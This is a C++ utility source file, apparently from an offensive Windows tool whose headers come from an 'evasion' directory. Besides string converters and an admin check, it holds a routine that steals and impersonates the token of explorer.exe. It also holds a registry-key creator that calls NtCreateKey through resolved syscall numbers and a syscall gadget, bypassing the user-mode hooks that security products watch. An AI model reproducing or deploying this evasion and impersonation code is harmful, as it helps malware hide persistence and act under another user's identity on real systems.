#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <ntstatus.h>

#include "Shared.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"

#include <sddl.h>
#include <vector>
#include <sstream>
#include <iomanip>
#include <tlhelp32.h>

namespace utils {

std::string ws2s(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

std::wstring s2ws(const std::string& str) {
    if (str.empty()) return L"";
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

std::wstring GetCurrentUserSid() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return L"";
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    std::vector<BYTE> buffer(dwSize);
    if (!GetTokenInformation(hToken, TokenUser, buffer.data(), dwSize, &dwSize)) {
        CloseHandle(hToken);
        return L"";
    }
    PTOKEN_USER pTokenUser = (PTOKEN_USER)buffer.data();
    LPWSTR stringSid = NULL;
    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &stringSid)) {
        CloseHandle(hToken);
        return L"";
    }
    std::wstring sid(stringSid);
    LocalFree(stringSid);
    CloseHandle(hToken);
    return sid;
}

bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

bool ImpersonateLoggedOnUser() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    DWORD explorerPid = 0;
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, L"explorer.exe") == 0) {
                explorerPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (explorerPid == 0) return false;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, explorerPid);
    if (!hProcess) return false;

    HANDLE hToken = NULL;
    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        HANDLE hDupToken = NULL;
        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
            if (SetThreadToken(NULL, hDupToken)) {
                CloseHandle(hDupToken);
                CloseHandle(hToken);
                CloseHandle(hProcess);
                return true;
            }
            CloseHandle(hDupToken);
        }
        CloseHandle(hToken);
    }
    CloseHandle(hProcess);
    return false;
}

void RevertToSelf() {
    ::RevertToSelf();
}

namespace Shared {

LONG NtCreateKeyRelative(HANDLE hParent, const std::wstring& relativePath, PHANDLE phKey) {
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntCreateKeySsn = resolver.GetServiceNumber("NtCreateKey");
    PVOID gadget = resolver.GetSyscallGadget();
    if (ntCreateKeySsn == 0xFFFFFFFF || !gadget) return STATUS_NOT_IMPLEMENTED;

    std::vector<std::wstring> components;
    std::wstringstream ss(relativePath);
    std::wstring item;
    while (std::getline(ss, item, L'\\')) {
        if (!item.empty()) components.push_back(item);
    }

    HANDLE hCurrent = hParent;
    for (size_t i = 0; i < components.size(); ++i) {
        UNICODE_STRING uName;
        uName.Buffer = (PWSTR)components[i].c_str();
        uName.Length = (USHORT)(components[i].length() * sizeof(wchar_t));
        uName.MaximumLength = uName.Length + sizeof(wchar_t);

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &uName, OBJ_CASE_INSENSITIVE, hCurrent, NULL);

        HANDLE hNext = NULL;
        NTSTATUS status = InternalDoSyscall(ntCreateKeySsn, gadget, (UINT_PTR)&hNext, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&objAttr, 0, 0, (UINT_PTR)REG_OPTION_NON_VOLATILE, 0, 0, 0, 0, 0);

        if (hCurrent != hParent) {
            evasion::SysNtClose(hCurrent);
        }

        if (!NT_SUCCESS(status)) return status;
        hCurrent = hNext;
    }

    *phKey = hCurrent;
    return STATUS_SUCCESS;
}

std::string ToHex(unsigned long long val) {
    std::stringstream ss;
    ss << "0x" << std::hex << std::uppercase << std::setfill('0') << std::setw(16) << val;
    return ss.str();
}

} // namespace Shared
} // namespace utils
